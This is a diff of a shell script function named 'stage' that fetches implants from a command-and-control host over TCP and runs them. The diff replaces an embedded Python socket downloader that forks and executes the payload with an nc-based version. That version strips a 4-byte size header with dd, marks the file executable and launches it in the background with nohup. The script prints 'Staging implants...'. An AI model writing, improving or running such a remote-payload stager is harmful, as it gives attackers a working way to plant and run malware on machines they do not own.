@@ -6,34 +6,28 @@ stage() {
     local port=$1
     local drop=$2
 
-    python3 - <<EOF
-import socket, struct, os, stat
+    # Connect via nc, read 4 byte size header + data
+    local tmpraw=$(mktemp)
+    nc -w 10 "$C2" "$port" > "$tmpraw" 2>/dev/null
 
-try:
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(10)
-    s.connect(("$C2", $port))
-    size_data = s.recv(4)
-    size = struct.unpack('<I', size_data)[0]
-    data = b''
-    while len(data) < size:
-        chunk = s.recv(size - len(data))
-        if not chunk:
-            break
-        data += chunk
-    s.close()
+    if [ ! -s "$tmpraw" ]; then
+        echo "[-] Failed port $port"
+        rm -f "$tmpraw"
+        return 1
+    fi
 
-    with open("$drop", "wb") as f:
-        f.write(data)
-    os.chmod("$drop", stat.S_IRWXU)
-    pid = os.fork()
-    if pid == 0:
-        os.setsid()
-        os.execv("$drop", ["$drop"])
-    print("[+] $drop started")
-except Exception as e:
-    print(f"[-] Failed port $port: {e}")
-EOF
+    # Strip the 4 byte size header and save the rest
+    dd if="$tmpraw" bs=1 skip=4 of="$drop" 2>/dev/null
+    rm -f "$tmpraw"
+
+    if [ -s "$drop" ]; then
+        chmod +x "$drop"
+        nohup "$drop" >/dev/null 2>&1 &
+        echo "[+] $drop started"
+    else
+        echo "[-] Empty payload port $port"
+        rm -f "$drop"
+    fi
 }
 
 echo "[*] Staging implants..."
